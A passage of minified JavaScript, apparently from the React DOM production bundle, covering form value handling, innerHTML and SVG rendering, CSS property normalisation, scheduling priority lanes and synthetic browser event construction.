    ("number" !== t || Vo(e.ownerDocument) !== e) && (null == n ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
}
var er = Array.isArray;

function En(e, t, n, r) {
    if (e = e.options, t) {
        t = {};
        for (var o = 0; o < n.length; o++) t["$" + n[o]] = !0;
        for (n = 0; n < e.length; n++) o = t.hasOwnProperty("$" + e[n].value), e[n].selected !== o && (e[n].selected = o), o && r && (e[n].defaultSelected = !0)
    } else {
        for (n = "" + zt(n), t = null, o = 0; o < e.length; o++) {
            if (e[o].value === n) return e[o].selected = !0, void (r && (e[o].defaultSelected = !0));
            null !== t || e[o].disabled || (t = e[o])
        }
        null !== t && (t.selected = !0)
    }
}

function Ai(e, t) {
    if (null != t.dangerouslySetInnerHTML) throw Error(E(91));
    return Q({}, t, {
        value: void 0,
        defaultValue: void 0,
        children: "" + e._wrapperState.initialValue
    })
}

function Bu(e, t) {
    var n = t.value;
    if (null == n) {
        if (n = t.children, t = t.defaultValue, null != n) {
            if (null != t) throw Error(E(92));
            if (er(n)) {
                if (1 < n.length) throw Error(E(93));
                n = n[0]
            }
            t = n
        }
        null == t && (t = ""), n = t
    }
    e._wrapperState = {
        initialValue: zt(n)
    }
}

function jc(e, t) {
    var n = zt(t.value),
        r = zt(t.defaultValue);
    null != n && ((n = "" + n) !== e.value && (e.value = n), null == t.defaultValue && e.defaultValue !== n && (e.defaultValue = n)), null != r && (e.defaultValue = "" + r)
}

function Gu(e) {
    var t = e.textContent;
    t === e._wrapperState.initialValue && "" !== t && null !== t && (e.value = t)
}

function Oc(e) {
    switch (e) {
        case "svg":
            return "http://www.w3.org/2000/svg";
        case "math":
            return "http://www.w3.org/1998/Math/MathML";
        default:
            return "http://www.w3.org/1999/xhtml"
    }
}

function $i(e, t) {
    return null == e || "http://www.w3.org/1999/xhtml" === e ? Oc(t) : "http://www.w3.org/2000/svg" === e && "foreignObject" === t ? "http://www.w3.org/1999/xhtml" : e
}
var to, zc = function (e) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function (t, n, r, o) {
        MSApp.execUnsafeLocalFunction((function () {
            return e(t, n)
        }))
    } : e
}((function (e, t) {
    if ("http://www.w3.org/2000/svg" !== e.namespaceURI || "innerHTML" in e) e.innerHTML = t;
    else {
        for ((to = to || document.createElement("div")).innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = to.firstChild; e.firstChild;) e.removeChild(e.firstChild);
        for (; t.firstChild;) e.appendChild(t.firstChild)
    }
}));

function hr(e, t) {
    if (t) {
        var n = e.firstChild;
        if (n && n === e.lastChild && 3 === n.nodeType) return void (n.nodeValue = t)
    }
    e.textContent = t
}
var lr = {
    animationIterationCount: !0,
    aspectRatio: !0,
    borderImageOutset: !0,
    borderImageSlice: !0,
    borderImageWidth: !0,
    boxFlex: !0,
    boxFlexGroup: !0,
    boxOrdinalGroup: !0,
    columnCount: !0,
    columns: !0,
    flex: !0,
    flexGrow: !0,
    flexPositive: !0,
    flexShrink: !0,
    flexNegative: !0,
    flexOrder: !0,
    gridArea: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowSpan: !0,
    gridRowStart: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnSpan: !0,
    gridColumnStart: !0,
    fontWeight: !0,
    lineClamp: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    tabSize: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0,
    fillOpacity: !0,
    floodOpacity: !0,
    stopOpacity: !0,
    strokeDasharray: !0,
    strokeDashoffset: !0,
    strokeMiterlimit: !0,
    strokeOpacity: !0,
    strokeWidth: !0
},
    pm = ["Webkit", "ms", "Moz", "O"];

function Lc(e, t, n) {
    return null == t || "boolean" == typeof t || "" === t ? "" : n || "number" != typeof t || 0 === t || lr.hasOwnProperty(e) && lr[e] ? ("" + t).trim() : t + "px"
}

function Mc(e, t) {
    for (var n in e = e.style, t)
        if (t.hasOwnProperty(n)) {
            var r = 0 === n.indexOf("--"),
                o = Lc(n, t[n], r);
            "float" === n && (n = "cssFloat"), r ? e.setProperty(n, o) : e[n] = o
        }
}
Object.keys(lr).forEach((function (e) {
    pm.forEach((function (t) {
        t = t + e.charAt(0).toUpperCase() + e.substring(1), lr[t] = lr[e]
    }))
}));
var mm = Q({
    menuitem: !0
}, {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0
});

function Di(e, t) {
    if (t) {
        if (mm[e] && (null != t.children || null != t.dangerouslySetInnerHTML)) throw Error(E(137, e));
        if (null != t.dangerouslySetInnerHTML) {
            if (null != t.children) throw Error(E(60));
            if ("object" != typeof t.dangerouslySetInnerHTML || !("__html" in t.dangerouslySetInnerHTML)) throw Error(E(61))
        }
        if (null != t.style && "object" != typeof t.style) throw Error(E(62))
    }
}

function Fi(e, t) {
    if (-1 === e.indexOf("-")) return "string" == typeof t.is;
    switch (e) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0
    }
}
var Vi = null;

function Hs(e) {
    return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement), 3 === e.nodeType ? e.parentNode : e
}
var Ui = null,
    kn = null,
    Cn = null;

function Ku(e) {
    if (e = Fr(e)) {
        if ("function" != typeof Ui) throw Error(E(280));
        var t = e.stateNode;
        t && (t = Sl(t), Ui(e.stateNode, e.type, t))
    }
}

function Ac(e) {
    kn ? Cn ? Cn.push(e) : Cn = [e] : kn = e
}

function $c() {
    if (kn) {
        var e = kn,
            t = Cn;
        if (Cn = kn = null, Ku(e), t)
            for (e = 0; e < t.length; e++) Ku(t[e])
    }
}

function Dc(e, t) {
    return e(t)
}

function Fc() { }
var ql = !1;

function Vc(e, t, n) {
    if (ql) return e(t, n);
    ql = !0;
    try {
        return Dc(e, t, n)
    } finally {
        ql = !1, (null !== kn || null !== Cn) && (Fc(), $c())
    }
}

function vr(e, t) {
    var n = e.stateNode;
    if (null === n) return null;
    var r = Sl(n);
    if (null === r) return null;
    n = r[t];
    e: switch (t) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (r = !r.disabled) || (r = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)), e = !r;
            break e;
        default:
            e = !1
    }
    if (e) return null;
    if (n && "function" != typeof n) throw Error(E(231, t, typeof n));
    return n
}
var bi = !1;
if (st) try {
    var Hn = {};
    Object.defineProperty(Hn, "passive", {
        get: function () {
            bi = !0
        }
    }), window.addEventListener("test", Hn, Hn), window.removeEventListener("test", Hn, Hn)
} catch {
    bi = !1
}

function hm(e, t, n, r, o, l, i, s, u) {
    var a = Array.prototype.slice.call(arguments, 3);
    try {
        t.apply(n, a)
    } catch (c) {
        this.onError(c)
    }
}
var ir = !1,
    Uo = null,
    bo = !1,
    Wi = null,
    vm = {
        onError: function (e) {
            ir = !0, Uo = e
        }
    };

function gm(e, t, n, r, o, l, i, s, u) {
    ir = !1, Uo = null, hm.apply(vm, arguments)
}

function ym(e, t, n, r, o, l, i, s, u) {
    if (gm.apply(this, arguments), ir) {
        if (!ir) throw Error(E(198));
        var a = Uo;
        ir = !1, Uo = null, bo || (bo = !0, Wi = a)
    }
}

function ln(e) {
    var t = e,
        n = e;
    if (e.alternate)
        for (; t.return;) t = t.return;
    else {
        e = t;
        do {
            4098 & (t = e).flags && (n = t.return), e = t.return
        } while (e)
    }
    return 3 === t.tag ? n : null
}

function Uc(e) {
    if (13 === e.tag) {
        var t = e.memoizedState;
        if (null === t && (null !== (e = e.alternate) && (t = e.memoizedState)), null !== t) return t.dehydrated
    }
    return null
}

function Qu(e) {
    if (ln(e) !== e) throw Error(E(188))
}

function wm(e) {
    var t = e.alternate;
    if (!t) {
        if (null === (t = ln(e))) throw Error(E(188));
        return t !== e ? null : e
    }
    for (var n = e, r = t; ;) {
        var o = n.return;
        if (null === o) break;
        var l = o.alternate;
        if (null === l) {
            if (null !== (r = o.return)) {
                n = r;
                continue
            }
            break
        }
        if (o.child === l.child) {
            for (l = o.child; l;) {
                if (l === n) return Qu(o), e;
                if (l === r) return Qu(o), t;
                l = l.sibling
            }
            throw Error(E(188))
        }
        if (n.return !== r.return) n = o, r = l;
        else {
            for (var i = !1, s = o.child; s;) {
                if (s === n) {
                    i = !0, n = o, r = l;
                    break
                }
                if (s === r) {
                    i = !0, r = o, n = l;
                    break
                }
                s = s.sibling
            }
            if (!i) {
                for (s = l.child; s;) {
                    if (s === n) {
                        i = !0, n = l, r = o;
                        break
                    }
                    if (s === r) {
                        i = !0, r = l, n = o;
                        break
                    }
                    s = s.sibling
                }
                if (!i) throw Error(E(189))
            }
        }
        if (n.alternate !== r) throw Error(E(190))
    }
    if (3 !== n.tag) throw Error(E(188));
    return n.stateNode.current === n ? e : t
}

function bc(e) {
    return null !== (e = wm(e)) ? Wc(e) : null
}

function Wc(e) {
    if (5 === e.tag || 6 === e.tag) return e;
    for (e = e.child; null !== e;) {
        var t = Wc(e);
        if (null !== t) return t;
        e = e.sibling
    }
    return null
}
var Hc = Ne.unstable_scheduleCallback,
    Yu = Ne.unstable_cancelCallback,
    xm = Ne.unstable_shouldYield,
    Sm = Ne.unstable_requestPaint,
    X = Ne.unstable_now,
    _m = Ne.unstable_getCurrentPriorityLevel,
    Bs = Ne.unstable_ImmediatePriority,
    Bc = Ne.unstable_UserBlockingPriority,
    Wo = Ne.unstable_NormalPriority,
    Em = Ne.unstable_LowPriority,
    Gc = Ne.unstable_IdlePriority,
    gl = null,
    Je = null;

function km(e) {
    if (Je && "function" == typeof Je.onCommitFiberRoot) try {
        Je.onCommitFiberRoot(gl, e, void 0, !(128 & ~e.current.flags))
    } catch { }
}
var be = Math.clz32 ? Math.clz32 : Pm,
    Cm = Math.log,
    Nm = Math.LN2;

function Pm(e) {
    return 0 === (e >>>= 0) ? 32 : 31 - (Cm(e) / Nm | 0) | 0
}
var no = 64,
    ro = 4194304;

function tr(e) {
    switch (e & -e) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return 4194240 & e;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return 130023424 & e;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 1073741824;
        default:
            return e
    }
}

function Ho(e, t) {
    var n = e.pendingLanes;
    if (0 === n) return 0;
    var r = 0,
        o = e.suspendedLanes,
        l = e.pingedLanes,
        i = 268435455 & n;
    if (0 !== i) {
        var s = i & ~o;
        0 !== s ? r = tr(s) : 0 !== (l &= i) && (r = tr(l))
    } else 0 !== (i = n & ~o) ? r = tr(i) : 0 !== l && (r = tr(l));
    if (0 === r) return 0;
    if (0 !== t && t !== r && !(t & o) && ((o = r & -r) >= (l = t & -t) || 16 === o && 4194240 & l)) return t;
    if (4 & r && (r |= 16 & n), 0 !== (t = e.entangledLanes))
        for (e = e.entanglements, t &= r; 0 < t;) o = 1 << (n = 31 - be(t)), r |= e[n], t &= ~o;
    return r
}

function Tm(e, t) {
    switch (e) {
        case 1:
        case 2:
        case 4:
            return t + 250;
        case 8:
        case 16:
        case 32:
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return t + 5e3;
        default:
            return -1
    }
}

function Im(e, t) {
    for (var n = e.suspendedLanes, r = e.pingedLanes, o = e.expirationTimes, l = e.pendingLanes; 0 < l;) {
        var i = 31 - be(l),
            s = 1 << i,
            u = o[i]; - 1 === u ? (!(s & n) || s & r) && (o[i] = Tm(s, t)) : u <= t && (e.expiredLanes |= s), l &= ~s
    }
}

function Hi(e) {
    return 0 !== (e = -1073741825 & e.pendingLanes) ? e : 1073741824 & e ? 1073741824 : 0
}

function Kc() {
    var e = no;
    return !(4194240 & (no <<= 1)) && (no = 64), e
}

function ei(e) {
    for (var t = [], n = 0; 31 > n; n++) t.push(e);
    return t
}

function $r(e, t, n) {
    e.pendingLanes |= t, 536870912 !== t && (e.suspendedLanes = 0, e.pingedLanes = 0), (e = e.eventTimes)[t = 31 - be(t)] = n
}

function Rm(e, t) {
    var n = e.pendingLanes & ~t;
    e.pendingLanes = t, e.suspendedLanes = 0, e.pingedLanes = 0, e.expiredLanes &= t, e.mutableReadLanes &= t, e.entangledLanes &= t, t = e.entanglements;
    var r = e.eventTimes;
    for (e = e.expirationTimes; 0 < n;) {
        var o = 31 - be(n),
            l = 1 << o;
        t[o] = 0, r[o] = -1, e[o] = -1, n &= ~l
    }
}

function Gs(e, t) {
    var n = e.entangledLanes |= t;
    for (e = e.entanglements; n;) {
        var r = 31 - be(n),
            o = 1 << r;
        o & t | e[r] & t && (e[r] |= t), n &= ~o
    }
}
var $ = 0;

function Qc(e) {
    return 1 < (e &= -e) ? 4 < e ? 268435455 & e ? 16 : 536870912 : 4 : 1
}
var Yc, Ks, Xc, Jc, Zc, Bi = !1,
    oo = [],
    Ct = null,
    Nt = null,
    Pt = null,
    gr = new Map,
    yr = new Map,
    xt = [],
    jm = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");

function Xu(e, t) {
    switch (e) {
        case "focusin":
        case "focusout":
            Ct = null;
            break;
        case "dragenter":
        case "dragleave":
            Nt = null;
            break;
        case "mouseover":
        case "mouseout":
            Pt = null;
            break;
        case "pointerover":
        case "pointerout":
            gr.delete(t.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            yr.delete(t.pointerId)
    }
}

function Bn(e, t, n, r, o, l) {
    return null === e || e.nativeEvent !== l ? (e = {
        blockedOn: t,
        domEventName: n,
        eventSystemFlags: r,
        nativeEvent: l,
        targetContainers: [o]
    }, null !== t && (null !== (t = Fr(t)) && Ks(t)), e) : (e.eventSystemFlags |= r, t = e.targetContainers, null !== o && -1 === t.indexOf(o) && t.push(o), e)
}

function Om(e, t, n, r, o) {
    switch (t) {
        case "focusin":
            return Ct = Bn(Ct, e, t, n, r, o), !0;
        case "dragenter":
            return Nt = Bn(Nt, e, t, n, r, o), !0;
        case "mouseover":
            return Pt = Bn(Pt, e, t, n, r, o), !0;
        case "pointerover":
            var l = o.pointerId;
            return gr.set(l, Bn(gr.get(l) || null, e, t, n, r, o)), !0;
        case "gotpointercapture":
            return l = o.pointerId, yr.set(l, Bn(yr.get(l) || null, e, t, n, r, o)), !0
    }
    return !1
}

function qc(e) {
    var t = Bt(e.target);
    if (null !== t) {
        var n = ln(t);
        if (null !== n)
            if (13 === (t = n.tag)) {
                if (null !== (t = Uc(n))) return e.blockedOn = t, void Zc(e.priority, (function () {
                    Xc(n)
                }))
            } else if (3 === t && n.stateNode.current.memoizedState.isDehydrated) return void (e.blockedOn = 3 === n.tag ? n.stateNode.containerInfo : null)
    }
    e.blockedOn = null
}

function No(e) {
    if (null !== e.blockedOn) return !1;
    for (var t = e.targetContainers; 0 < t.length;) {
        var n = Gi(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
        if (null !== n) return null !== (t = Fr(n)) && Ks(t), e.blockedOn = n, !1;
        var r = new (n = e.nativeEvent).constructor(n.type, n);
        Vi = r, n.target.dispatchEvent(r), Vi = null, t.shift()
    }
    return !0
}

function Ju(e, t, n) {
    No(e) && n.delete(t)
}

function zm() {
    Bi = !1, null !== Ct && No(Ct) && (Ct = null), null !== Nt && No(Nt) && (Nt = null), null !== Pt && No(Pt) && (Pt = null), gr.forEach(Ju), yr.forEach(Ju)
}

function Gn(e, t) {
    e.blockedOn === t && (e.blockedOn = null, Bi || (Bi = !0, Ne.unstable_scheduleCallback(Ne.unstable_NormalPriority, zm)))
}

function wr(e) {
    function t(o) {
        return Gn(o, e)
    }
    if (0 < oo.length) {
        Gn(oo[0], e);
        for (var n = 1; n < oo.length; n++) {
            var r = oo[n];
            r.blockedOn === e && (r.blockedOn = null)
        }
    }
    for (null !== Ct && Gn(Ct, e), null !== Nt && Gn(Nt, e), null !== Pt && Gn(Pt, e), gr.forEach(t), yr.forEach(t), n = 0; n < xt.length; n++)(r = xt[n]).blockedOn === e && (r.blockedOn = null);
    for (; 0 < xt.length && null === (n = xt[0]).blockedOn;) qc(n), null === n.blockedOn && xt.shift()
}
var Nn = pt.ReactCurrentBatchConfig,
    Bo = !0;

function Lm(e, t, n, r) {
    var o = $,
        l = Nn.transition;
    Nn.transition = null;
    try {
        $ = 1, Qs(e, t, n, r)
    } finally {
        $ = o, Nn.transition = l
    }
}

function Mm(e, t, n, r) {
    var o = $,
        l = Nn.transition;
    Nn.transition = null;
    try {
        $ = 4, Qs(e, t, n, r)
    } finally {
        $ = o, Nn.transition = l
    }
}

function Qs(e, t, n, r) {
    if (Bo) {
        var o = Gi(e, t, n, r);
        if (null === o) ci(e, t, r, Go, n), Xu(e, r);
        else if (Om(o, e, t, n, r)) r.stopPropagation();
        else if (Xu(e, r), 4 & t && -1 < jm.indexOf(e)) {
            for (; null !== o;) {
                var l = Fr(o);
                if (null !== l && Yc(l), null === (l = Gi(e, t, n, r)) && ci(e, t, r, Go, n), l === o) break;
                o = l
            }
            null !== o && r.stopPropagation()
        } else ci(e, t, r, null, n)
    }
}
var Go = null;

function Gi(e, t, n, r) {
    if (Go = null, null !== (e = Bt(e = Hs(r))))
        if (null === (t = ln(e))) e = null;
        else if (13 === (n = t.tag)) {
            if (null !== (e = Uc(t))) return e;
            e = null
        } else if (3 === n) {
            if (t.stateNode.current.memoizedState.isDehydrated) return 3 === t.tag ? t.stateNode.containerInfo : null;
            e = null
        } else t !== e && (e = null);
    return Go = e, null
}

function ed(e) {
    switch (e) {
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 1;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "toggle":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 4;
        case "message":
            switch (_m()) {
                case Bs:
                    return 1;
                case Bc:
                    return 4;
                case Wo:
                case Em:
                    return 16;
                case Gc:
                    return 536870912;
                default:
                    return 16
            }
        default:
            return 16
    }
}
var Et = null,
    Ys = null,
    Po = null;

function td() {
    if (Po) return Po;
    var e, r, t = Ys,
        n = t.length,
        o = "value" in Et ? Et.value : Et.textContent,
        l = o.length;
    for (e = 0; e < n && t[e] === o[e]; e++);
    var i = n - e;
    for (r = 1; r <= i && t[n - r] === o[l - r]; r++);
    return Po = o.slice(e, 1 < r ? 1 - r : void 0)
}

function To(e) {
    var t = e.keyCode;
    return "charCode" in e ? 0 === (e = e.charCode) && 13 === t && (e = 13) : e = t, 10 === e && (e = 13), 32 <= e || 13 === e ? e : 0
}

function lo() {
    return !0
}

function Zu() {
    return !1
}

function Re(e) {
    function t(n, r, o, l, i) {
        for (var s in this._reactName = n, this._targetInst = o, this.type = r, this.nativeEvent = l, this.target = i, this.currentTarget = null, e) e.hasOwnProperty(s) && (n = e[s], this[s] = n ? n(l) : l[s]);
        return this.isDefaultPrevented = (null != l.defaultPrevented ? l.defaultPrevented : !1 === l.returnValue) ? lo : Zu, this.isPropagationStopped = Zu, this
    }
    return Q(t.prototype, {
        preventDefault: function () {
            this.defaultPrevented = !0;
            var n = this.nativeEvent;
            n && (n.preventDefault ? n.preventDefault() : "unknown" != typeof n.returnValue && (n.returnValue = !1), this.isDefaultPrevented = lo)
        },
        stopPropagation: function () {
            var n = this.nativeEvent;
            n && (n.stopPropagation ? n.stopPropagation() : "unknown" != typeof n.cancelBubble && (n.cancelBubble = !0), this.isPropagationStopped = lo)
        },
        persist: function () { },
        isPersistent: lo
    }), t
}
var ti, ni, Kn, Vn = {
    eventPhase: 0,
    bubbles: 0,
    cancelable: 0,
    timeStamp: function (e) {
        return e.timeStamp || Date.now()
    },
    defaultPrevented: 0,
    isTrusted: 0
},
    Xs = Re(Vn),
    Dr = Q({}, Vn, {
        view: 0,
        detail: 0
    }),
    Am = Re(Dr),
    yl = Q({}, Dr, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: Js,
        button: 0,
        buttons: 0,
        relatedTarget: function (e) {
            return void 0 === e.relatedTarget ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
        },
        movementX: function (e) {
            return "movementX" in e ? e.movementX : (e !== Kn && (Kn && "mousemove" === e.type ? (ti = e.screenX - Kn.screenX, ni = e.screenY - Kn.screenY) : ni = ti = 0, Kn = e), ti)
        },
        movementY: function (e) {
            return "movementY" in e ? e.movementY : ni
        }
    }),
    qu = Re(yl),
    $m = Q({}, yl, {
        dataTransfer: 0
    }),
    Dm = Re($m),
    Fm = Q({}, Dr, {
        relatedTarget: 0
    }),
    ri = Re(Fm),
    Vm = Q({}, Vn, {
        animationName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }),
    Um = Re(Vm),
    bm = Q({}, Vn, {
        clipboardData: function (e) {
            return "clipboardData" in e ? e.clipboardData : window.clipboardData
        }
    }),
    Wm = Re(bm),
    Hm = Q({}, Vn, {
        data: 0
    }),
    ea = Re(Hm),
    Bm = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified"
    },
    Gm = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta"
    },
    Km = {
        Alt: "altKey",
        Control: "ctrlKey",
        Meta: "metaKey",
        Shift: "shiftKey"
    };

function Qm(e) {
    var t = this.nativeEvent;
    return t.getModifierState ? t.getModifierState(e) : !!(e = Km[e]) && !!t[e]
}

function Js() {
    return Qm
}
var Ym = Q({}, Dr, {
    key: function (e) {
        if (e.key) {
            var t = Bm[e.key] || e.key;
            if ("Unidentified" !== t) return t
        }
        return "keypress" === e.type ? 13 === (e = To(e)) ? "Enter" : String.fromCharCode(e) : "keydown" === e.type || "keyup" === e.type ? Gm[e.keyCode] || "Unidentified" : ""
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: Js,
    charCode: function (e) {
        return "keypress" === e.type ? To(e) : 0
    },
    keyCode: function (e) {
        return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
    },
    which: function (e) {
        return "keypress" === e.type ? To(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
    }
}),
    Xm = Re(Ym),
    Jm = Q({}, yl, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0
    }),
    ta = Re(Jm),
    Zm = Q({}, Dr, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: Js
    }),
    qm = Re(Zm),
    eh = Q({}, Vn, {
        propertyName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }),
    th = Re(eh),
    nh = Q({}, yl, {
        deltaX: function (e) {
            return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0
        },
        deltaY: function (e) {
            return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0
        },
        deltaZ: 0,
        deltaMode: 0
    }),
    rh = Re(nh),
    oh = [9, 13, 27, 32],
    Zs = st && "CompositionEvent" in window,
    sr = null;
st && "documentMode" in document && (sr = document.documentMode);
var lh = st && "TextEvent" in window && !sr,
    nd = st && (!Zs || sr && 8 < sr && 11 >= sr),
    na = " ",
    ra = !1;

function rd(e, t) {
    switch (e) {
        case "keyup":
            return -1 !== oh.indexOf(t.keyCode);
        case "keydown":
            return 229 !== t.keyCode;
        case "keypress":
        case "mousedown":
        case "focusout":
            return !0;
        default:
            return !1
    }
}

function od(e) {
    return "object" == typeof (e = e.detail) && "data" in e ? e.data : null
}
var pn = !1;

function ih(e, t) {
    switch (e) {
        case "compositionend":
            return od(t);
        case "keypress":
            return 32 !== t.which ? null : (ra = !0, na);
        case "textInput":
            return (e = t.data) === na && ra ? null : e;
        default:
            return null
    }
}

function sh(e, t) {
    if (pn) return "compositionend" === e || !Zs && rd(e, t) ? (e = td(), Po = Ys = Et = null, pn = !1, e) : null;
    switch (e) {
        case "paste":
        default:
            return null;
        case "keypress":
            if (!(t.ctrlKey || t.altKey || t.metaKey) || t.ctrlKey && t.altKey) {
                if (t.char && 1 < t.char.length) return t.char;
                if (t.which) return String.fromCharCode(t.which)
            }
            return null;
        case "compositionend":
            return nd && "ko" !== t.locale ? null : t.data
    }
}
var uh = {
    color: !0,
    date: !0,
    datetime: !0,
    "datetime-local": !0,
    email: !0,
    month: !0,
    number: !0,
    password: !0,
    range: !0,
    search: !0,
    tel: !0,
    text: !0,
    time: !0,
    url: !0,
    week: !0
};

function oa(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return "input" === t ? !!uh[e.type] : "textarea" === t
}

function ld(e, t, n, r) {
    Ac(r), 0 < (t = Ko(t, "onChange")).length && (n = new Xs("onChange", "change", null, n, r), e.push({
        event: n,
        listeners: t
    }))
}
var ur = null,
    xr = null;

function ah(e) {
    vd(e, 0)
}

function wl(e) {
    if (Ic(vn(e))) return e
}

function ch(e, t) {
    if ("change" === e) return t
}
var id = !1;
if (st) {
    var oi;
    if (st) {
        var li = "oninput" in document;
        if (!li) {
            var la = document.createElement("div");
            la.setAttribute("oninput", "return;"), li = "function" == typeof la.oninput
        }
        oi = li
    } else oi = !1;
    id = oi && (!document.documentMode || 9 < document.documentMode)
}

function ia() {
    ur && (ur.detachEvent("onpropertychange", sd), xr = ur = null)
}

function sd(e) {
    if ("value" === e.propertyName && wl(xr)) {
        var t = [];
        ld(t, xr, e, Hs(e)), Vc(ah, t)
    }
}

function dh(e, t, n) {
    "focusin" === e ? (ia(), xr = n, (ur = t).attachEvent("onpropertychange", sd)) : "focusout" === e && ia()
}

function fh(e) {
    if ("selectionchange" === e || "keyup" === e || "keydown" === e) return wl(xr)
}

function ph(e, t) {
    if ("click" === e) return wl(t)
}

function mh(e, t) {
    if ("input" === e || "change" === e) return wl(t)
}

function hh(e, t) {
    return e === t && (0 !== e || 1 / e == 1 / t) || e != e && t != t
}
var He = "function" == typeof Object.is ? Object.is : hh;

function Sr(e, t) {
    if (He(e, t)) return !0;
    if ("object" != typeof e || null === e || "object" != typeof t || null === t) return !1;
    var n = Object.keys(e),
        r = Object.keys(t);
    if (n.length !== r.length) return !1;
    for (r = 0; r < n.length; r++) {
        var o = n[r];
        if (!Ti.call(t, o) || !He(e[o], t[o])) return !1
    }
    return !0
}

function sa(e) {
    for (; e && e.firstChild;) e = e.firstChild;
    return e
}

function ua(e, t) {
    var r, n = sa(e);
    for (e = 0; n;) {
        if (3 === n.nodeType) {
            if (r = e + n.textContent.length, e <= t && r >= t) return {
                node: n,
                offset: t - e
            };
            e = r
        }
        e: {
